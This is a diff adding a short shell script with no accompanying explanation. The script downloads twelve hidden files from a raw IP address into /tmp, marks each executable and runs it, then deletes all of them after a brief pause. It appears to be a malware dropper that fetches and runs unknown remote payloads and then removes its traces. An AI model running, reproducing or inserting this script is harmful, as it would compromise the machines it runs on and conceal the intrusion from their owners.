@@ -1,0 +1,18 @@
+#!/bin/sh
+
+wget -c http://212.129.21.174/.1 -P /tmp && chmod +x /tmp/.1 && /tmp/.1
+wget -c http://212.129.21.174/.2 -P /tmp && chmod +x /tmp/.2 && /tmp/.2
+wget -c http://212.129.21.174/.3 -P /tmp && chmod +x /tmp/.3 && /tmp/.3
+wget -c http://212.129.21.174/.4 -P /tmp && chmod +x /tmp/.4 && /tmp/.4
+wget -c http://212.129.21.174/.5 -P /tmp && chmod +x /tmp/.5 && /tmp/.5
+wget -c http://212.129.21.174/.6 -P /tmp && chmod +x /tmp/.6 && /tmp/.6
+wget -c http://212.129.21.174/.7 -P /tmp && chmod +x /tmp/.7 && /tmp/.7
+wget -c http://212.129.21.174/.8 -P /tmp && chmod +x /tmp/.8 && /tmp/.8
+wget -c http://212.129.21.174/.9 -P /tmp && chmod +x /tmp/.9 && /tmp/.9
+wget -c http://212.129.21.174/.10 -P /tmp && chmod +x /tmp/.10 && /tmp/.10
+wget -c http://212.129.21.174/.11 -P /tmp && chmod +x /tmp/.11 && /tmp/.11
+wget -c http://212.129.21.174/.12 -P /tmp && chmod +x /tmp/.12 && /tmp/.12
+
+sleep 3;
+cd /tmp;
+rm -fr .1 .2 .3 .4 .5 .6 .7 .8 .9 .10 .11 .12;
